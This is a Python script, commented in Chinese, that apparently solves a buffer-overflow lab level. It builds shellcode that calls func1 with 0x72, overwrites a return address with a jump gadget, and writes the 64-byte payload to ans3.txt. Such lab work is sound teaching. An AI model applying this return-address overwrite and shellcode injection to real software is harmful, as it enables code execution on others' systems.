import struct

def p64(addr):
    """将 64 位地址打包为小端序字节"""
    return struct.pack('<Q', addr)

# 关键地址
func1_addr = 0x401216
jmp_xs_addr = 0x401334

# ============================================
# 构造 Shellcode
# ============================================
# 目标：设置 rdi = 0x72，然后跳转到 func1
#
# 汇编代码：
#   mov rdi, 0x72        ; 设置第一个参数为 0x72 (114)
#   mov rax, func1_addr  ; 将 func1 地址放入 rax
#   jmp rax              ; 跳转到 func1
#
# 机器码：
#   48 C7 C7 72 00 00 00    ; mov rdi, 0x72  (7 bytes)
#   48 B8 16 12 40 00 00 00 00 00  ; mov rax, 0x401216  (10 bytes)
#   FF E0                    ; jmp rax  (2 bytes)
# ============================================

shellcode = b''
shellcode += b'\x48\xC7\xC7\x72\x00\x00\x00'  # mov rdi, 0x72
shellcode += b'\x48\xB8' + p64(func1_addr)     # mov rax, func1_addr
shellcode += b'\xFF\xE0'                        # jmp rax

print(f"[*] Shellcode length: {len(shellcode)} bytes")
print(f"[*] Shellcode (hex): {shellcode.hex()}")
print(f"[*] Shellcode (asm): mov rdi, 0x72; mov rax, 0x{func1_addr:x}; jmp rax")

# ============================================
# 构造完整 Payload (64 字节)
# ============================================
# 栈帧布局：
#   offset 0x00: shellcode           (saved_rsp+0x10 指向这里)
#   offset 0x13: padding
#   offset 0x28: 返回地址 (被覆盖为 jmp_xs)
#   offset 0x30: padding
#   offset 0x40: end of payload
#
# 执行流程：
#   1. func() 执行 memcpy() 将 payload 复制到 rbp-0x20
#   2. memcpy 复制 64 字节，会覆盖返回地址 (rbp+0x08)
#   3. func() 执行 ret，跳转到 jmp_xs
#   4. jmp_xs 读取 saved_rsp+0x10，跳转到 shellcode
#   5. shellcode 执行 func1(0x72)
# ============================================

payload = b''
payload += shellcode                               # offset 0x00: shellcode
payload += b'\x00' * (0x28 - len(payload))        # padding 到返回地址
payload += p64(jmp_xs_addr)                        # offset 0x28: 覆盖返回地址
payload += b'\x00' * (64 - len(payload))          # padding 到 64 字节

print(f"\n[*] Total payload length: {len(payload)} bytes")
print(f"[*] Payload structure:")
print(f"    Offset 0x00: Shellcode ({len(shellcode)} bytes)")
print(f"    Offset 0x28: Return address -> jmp_xs (0x{jmp_xs_addr:x})")

# 保存到文件
with open('ans3.txt', 'wb') as f:
    f.write(payload)

print(f"\n[+] Payload written to ans3.txt")

# 显示 payload 的十六进制
print(f"\n[*] Payload hex dump:")
for i in range(0, len(payload), 16):
    hex_part = ' '.join(f'{b:02x}' for b in payload[i:i+16])
    print(f"    0x{i:02x}: {hex_part}")
